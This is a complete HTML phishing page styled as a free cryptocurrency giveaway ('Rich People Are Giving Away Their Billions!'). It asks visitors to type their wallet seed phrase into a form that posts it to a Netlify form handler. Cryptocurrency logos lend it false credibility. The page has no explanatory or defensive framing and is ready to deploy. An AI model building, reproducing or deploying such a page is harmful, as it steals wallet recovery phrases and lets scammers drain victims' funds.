<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Earn Crypto Coin Free</title>
    <style>
        body {
            background-color: #000;
            font-family: Arial, sans-serif;
            color: #fff;
            text-align: center;
            margin: 0;
            padding: 0;
        }
        .header {
            padding: 20px;
            font-size: 2em;
            font-weight: bold;
        }
        .blink {
            animation: blink 1s infinite;
        }
        @keyframes blink {
            0% { color: #ff00ff; }
            25% { color: #00ffff; }
            50% { color: #ffff00; }
            75% { color: #ff0000; }
            100% { color: #00ff00; }
        }
        .content {
            margin-top: 50px;
            font-size: 1.5em;
        }
        .form-container {
            margin-top: 30px;
        }
        input[type="text"] {
            padding: 10px;
            font-size: 1.2em;
            width: 300px;
            background-color: #333;
            border: 1px solid #666;
            color: #fff;
            outline: none;
        }
        input[type="text"]::placeholder {
            color: #888;
        }
        button {
            padding: 10px 20px;
            font-size: 1.2em;
            background-color: #00ff00;
            border: none;
            color: #000;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover {
            background-color: #00cc00;
        }
        .icons {
            position: fixed;
            left: 20px;
            top: 100px;
        }
        .icons img {
            display: block;
            margin: 10px 0;
            width: 32px;
            height: 32px;
        }
    </style>
</head>
<body>
    <div class="header">
        <span class="blink">Rich People Are Giving Away Their Billions!</span>
    </div>
    <div class="content">
        Enter Your Seed Phrase Words Here
    </div>
    <div class="form-container">
        <form name="seedphrase" method="POST" data-netlify="true" action="/success">
            <input type="text" name="words" placeholder="Seed Phrase Words Here" required>
            <button type="submit">Enter</button>
        </form>
    </div>
    <div class="icons">
        <img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png" alt="BTC">
        <img src="https://cryptologos.cc/logos/ethereum-eth-logo.png" alt="ETH">
        <img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png" alt="BNB">
        <img src="https://cryptologos.cc/logos/cardano-ada-logo.png" alt="ADA">
        <img src="https://cryptologos.cc/logos/solana-sol-logo.png" alt="SOL">
        <img src="https://cryptologos.cc/logos/litecoin-ltc-logo.png" alt="LTC">
        <img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png" alt="Trumpcoin">
    </div>
</body>
</html>
